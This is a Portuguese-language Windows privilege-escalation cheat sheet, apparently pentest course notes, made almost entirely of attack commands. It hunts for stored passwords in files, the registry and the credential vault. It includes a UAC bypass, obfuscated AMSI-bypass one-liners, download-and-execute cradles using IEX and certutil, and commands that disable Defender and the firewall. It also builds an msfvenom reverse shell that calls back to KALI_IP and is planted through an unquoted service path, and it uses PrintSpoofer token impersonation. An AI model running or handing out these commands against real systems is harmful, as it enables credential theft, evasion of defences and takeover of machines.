# Comandos

## Auxiliares

### Stored Credentials

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir /b /s vnc.ini
gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

Procurar pela string "password" no HKLM e HKCU
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Procurar por credenciais no WinLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

Procurando por Patterns dentro do Registro
$pattern = "password"
$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"

Procurar nas chaves do registro
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }

Procuramos nos valores do registro
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}

cmdkey /list


[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
```

### UAC Byppass

```
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```

### AMSI Bypass

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### File Transfer

```
PowerShell Cmdlet (Powershell 3.0 and higher)
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

PowerShell One-Line Script Execution in Memory
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

PowerShell Script
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://server/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
		
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

CertUtil
certutil.exe -urlcache -split -f https://myserver/filename outputfilename

Certutil também pode ser usado para base64 encoding/decoding.
certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName

Impacket-Smbserver
impacket-smbserver share . -username 0x4rt3mis -password 123456 -smb2support
net use \\IP_KALI\share /u:0x4rt3mis 123456
copy file \\IP_KALI\\share\\file
```

### Disable Defenses

```
Desativar Windows Defender
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
sc stop WinDefend
"c:\program files\windows defender\MpCmdRun.exe" -RemoveDefinitions -All
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name
Verificação do Language Mode
$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
Desativando Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
netsh advfirewall set allprofiles state off
```

## Escalação

### Runas

```
runas /user:Curso\chitolina /savecred "powershell"
.\PsExec64.exe /accepteula -u Curso\chitolina -p password123 cmd
```

PSSession

```
$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('chitolina', $pass)
Invoke-Command -Computer Curso -ScriptBlock {whoami} -Credential $cred
```

## Escalação

### Unquoted Path

```
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
sc.exe qc RemoteSystemMonitorService
icacls "C:\Program Files"
icacls "C:\Program Files\Guerra Cibernetica"
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=KALI_PORT -f exe > exploit.exe
cd "C:\Program Files\Guerra Cibernetica"
wget http://KALI_IP/exploit.exe -o Curso.exe
sc.exe stop RemoteSystemMonitorService
sc.exe start RemoteSystemMonitorService
shutdown /r /t 0
```

### Token Impersonation

https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

```
msfvenom -p windows/shell_reverse_tcp lhost=KALI_IP lport=KALI_PORT -f exe > exploit.exe
https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx
gobuster dir -e -u http://192.168.89.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300
PrintSpoofer64.exe -i -c cmd
```

### Scheduled Tasks

```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
Get-ScheduledTask | where TaskName -EQ 'Update' | Get-ScheduledTaskInfo
$task = Get-ScheduledTask | where TaskName -EQ 'Update'
$task.Actions
```

### Automated Tools

https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md
https://github.com/GhostPack/Seatbelt
https://github.com/411Hall/JAWS

```
winPEAS.exe
seatbelt.exe -group=all
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
Import-Module ./PowerUp.ps1
Invoke-AllChecks
```

### Kernel

```
WESng.py
Import-Module ./Sherlock.ps1
Find-AllVulns
```
